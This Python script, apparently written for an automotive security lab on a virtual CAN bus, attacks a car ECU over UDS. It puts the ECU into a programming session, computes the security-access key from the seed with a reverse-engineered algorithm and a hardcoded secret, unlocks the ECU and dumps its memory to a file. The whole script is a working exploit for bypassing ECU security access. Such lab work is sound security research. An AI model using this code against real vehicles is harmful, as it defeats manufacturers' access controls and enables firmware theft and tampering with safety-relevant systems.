import can
import time

def key_from_seed(seed):
    secret = "5B 41 74 65 7D"
    s1 = int(secret[0:2],16)
    s2 = int(secret[3:5],16)
    s3 = int(secret[6:8],16)
    s4 = int(secret[9:11],16)
    s5 = int(secret[12:14],16)
    seed_int = (seed[0]<<16) + (seed[1]<<8) + (seed[2]) 
    or_ed_seed = ((seed_int & 0xFF0000) >> 16) | (seed_int & 0xFF00) | (s1 << 24) | (seed_int & 0xff) << 16
    mucked_value = 0xc541a9

    for i in range(0,32):
        a_bit = ((or_ed_seed >> i) & 1 ^ mucked_value & 1) << 23
        v9 = v10 = v8 = a_bit | (mucked_value >> 1)
        mucked_value = v10 & 0xEF6FD7 | ((((v9 & 0x100000) >> 20) ^ ((v8 & 0x800000) >> 23)) << 20) | (((((mucked_value >> 1) & 0x8000) >> 15) ^ ((v8 & 0x800000) >> 23)) << 15) | (((((mucked_value >> 1) & 0x1000) >> 12) ^ ((v8 & 0x800000) >> 23)) << 12) | 32 * ((((mucked_value >> 1) & 0x20) >> 5) ^ ((v8 & 0x800000) >> 23)) | 8 * ((((mucked_value >> 1) & 8) >> 3) ^ ((v8 & 0x800000) >> 23))

    for j in range(0,32):
        a_bit = ((((s5 << 24) | (s4 << 16) | s2 | (s3 << 8)) >> j) & 1 ^ mucked_value & 1) << 23
        v14 = v13 = v12 = a_bit | (mucked_value >> 1)
        mucked_value = v14 & 0xEF6FD7 | ((((v13 & 0x100000) >> 20) ^ ((v12 & 0x800000) >> 23)) << 20) | (((((mucked_value >> 1) & 0x8000) >> 15) ^ ((v12 & 0x800000) >> 23)) << 15) | (((((mucked_value >> 1) & 0x1000) >> 12) ^ ((v12 & 0x800000) >> 23)) << 12) | 32 * ((((mucked_value >> 1) & 0x20) >> 5) ^ ((v12 & 0x800000) >> 23)) | 8 * ((((mucked_value >> 1) & 8) >> 3) ^ ((v12 & 0x800000) >> 23))

    key = ((mucked_value & 0xF0000) >> 16) | 16 * (mucked_value & 0xF) | ((((mucked_value & 0xF00000) >> 20) | ((mucked_value & 0xF000) >> 8)) << 8) | ((mucked_value & 0xFF0) >> 4 << 16)
#    return "%02X %02X %02X" % ( (key & 0xff0000) >> 16, (key & 0xff00) >> 8, key & 0xff) 
    return [(key & 0xff0000) >> 16, (key & 0xff00) >> 8, key & 0xff]

def recv_msg(arb_id):
    resp = bus.recv()
    while (resp.arbitration_id != arb_id):
        resp = bus.recv()
    return resp
    

def send_msg(arb_id, data, is_extended=False):
	try:
		msg = can.Message(arbitration_id=arb_id, data=data, is_extended_id= is_extended)
		bus.send(msg)
		#print(f"Message sent on {bus.channel_info}")
	except can.CanError:
		print("Message NOT sent")

if __name__ == '__main__':

    bus = can.interface.Bus(interface='socketcan', channel='vcan0', bitrate=500000)

    #change the diagnostic session // cansend vcan0 7e0#021002
    send_msg(0x7e0, [0x02, 0x10, 0x02])
    resp = recv_msg(0x7e8)
    if (resp.data[1]==0x50 and resp.data[2]==0x02):  # 50 02
        print ("Successfull change into Programming Session")

    #request challenge // cansend vcan0 7e0#022701    
    send_msg(0x7e0, [0x02, 0x27, 0x01])
    resp = recv_msg(0x7e8)
    if (resp.data[1]==0x67 and resp.data[2]==0x01):    # 67 01 s1 s2 s3
        s1 = resp.data[3]
        s2 = resp.data[4]
        s3 = resp.data[5]
        print ("Seed: " + str(hex(s1)) + str(hex(s2)) + str(hex(s3)) )
    else:
         print ("Retrieving seeds failed")

    #provide key // cansend vcan0 7e0#052702k1k2k3
    key = key_from_seed([s1, s2, s3])
    print ("Key: " + str(hex(key[0])) + str(hex(key[1])) + str(hex(key[2])) )
    send_msg(0x7e0, [0x05, 0x27, 0x02, key[0], key[1], key[2]])
    resp = recv_msg(0x7e8)  
    if (resp.data[1]==0x67 and resp.data[2]==0x02):    # 67 02
        print ("Valid key!")
    else:
        print ("Key not accepted")

    #read memory by address // cansend vcan0 7e0#052321100001
    send_msg(0x7e0, [0x05, 0x23, 0x21, 0x10, 0x00, 0x01])
    resp = recv_msg(0x7e8)
    binary_data = bytearray()
    length = 1
    addr1 = 0
    addr2 = 0
    while (resp.data[1]==0x63):
        binary_data.append(resp.data[2])
        send_msg(0x7e0, [0x05, 0x23, 0x21, 0x10+addr1, 0x00+addr2, 0x01])
        resp = recv_msg(0x7e8)        
        length += 1
        addr2 += 1
        if addr2 > 0xFF:
             addr1 += 1
             addr2 = 0
    
    print (str(length) + " bytes read")
    with open("readout.bin", "wb") as file:        
        file.write(binary_data)
         

    
    